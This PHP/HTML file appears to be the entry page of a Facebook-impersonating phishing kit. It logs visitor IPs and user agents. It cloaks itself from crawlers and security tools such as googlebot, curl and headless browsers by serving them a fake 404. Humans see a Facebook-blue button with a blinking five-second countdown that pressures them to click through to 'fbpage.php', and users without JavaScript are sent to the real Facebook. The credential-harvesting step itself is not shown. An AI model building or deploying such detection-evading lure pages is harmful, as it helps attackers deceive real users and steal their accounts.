<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

$bot_keywords = ['bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 
                 'python', 'java', 'httpclient', 'headless', 'puppeteer', 
                 'selenium', 'phantom', 'googlebot', 'bingbot', 'slurp',
                 'facebookexternalhit', 'linkedinbot', 'twitterbot'];

$is_bot = false;
foreach ($bot_keywords as $keyword) {
    if (stripos($user_agent, $keyword) !== false) {
        $is_bot = true;
        break;
    }
}

$log = date('Y-m-d H:i:s') . " | IP: $ip | UA: $user_agent | Bot: " . ($is_bot ? 'YES' : 'NO') . PHP_EOL;
file_put_contents('visits.log', $log, FILE_APPEND);

if ($is_bot) {
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html>
    <head><title>404 Page Not Found</title></head>
    <body>
    <h1>404 - Page Not Found</h1>
    <p>The requested page could not be found.</p>
    </body>
    </html>';
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        .continue-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 15px;
        }
        .continue-btn:hover {
            background-color: #166fe5;
        }
        .timer-message {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
        }
        .warning-message {
            font-size: 13px;
            color: #e41e3f;
            margin-top: 15px;
            display: none;
        }
        @keyframes blink {
            50% { opacity: 0.5; }
        }
        .urgent {
            animation: blink 1s infinite;
            color: #e41e3f;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="timer-message" id="timerMessage">⏱️ Please click the button below within 5 seconds</div>
        <button class="continue-btn" id="continueBtn">Click here to continue</button>
        <div class="warning-message" id="warningMessage">⚠️ Too slow! Refreshing page...</div>
    </div>

    <script>
        const pageLoadTime = Date.now();
        let token = Date.now() + '_' + Math.random().toString(36).substr(2, 16);
        let clicked = false;
        
        const timerMessage = document.getElementById('timerMessage');
        const warningMessage = document.getElementById('warningMessage');
        let timeLeft = 5;
        
        const countdown = setInterval(function() {
            if (!clicked && timeLeft > 0) {
                timerMessage.innerHTML = `⏱️ Please click the button below within ${timeLeft} second${timeLeft !== 1 ? 's' : ''}`;
                
                if (timeLeft === 3) {
                    timerMessage.classList.add('urgent');
                }
                
                timeLeft--;
            } else if (timeLeft === 0 && !clicked) {
                clearInterval(countdown);
                timerMessage.style.display = 'none';
                warningMessage.style.display = 'block';
                
                setTimeout(function() {
                    window.location.reload();
                }, 1500);
            }
        }, 1000);
        
        document.getElementById('continueBtn').addEventListener('click', function() {
            if (!clicked) {
                clicked = true;
                clearInterval(countdown);
                window.location.href = 'fbpage.php?token=' + token + '&verify=' + pageLoadTime;
            }
        });
    </script>

    <noscript>
        <meta http-equiv="refresh" content="0; url=https://www.facebook.com">
    </noscript>
</body>
</html>
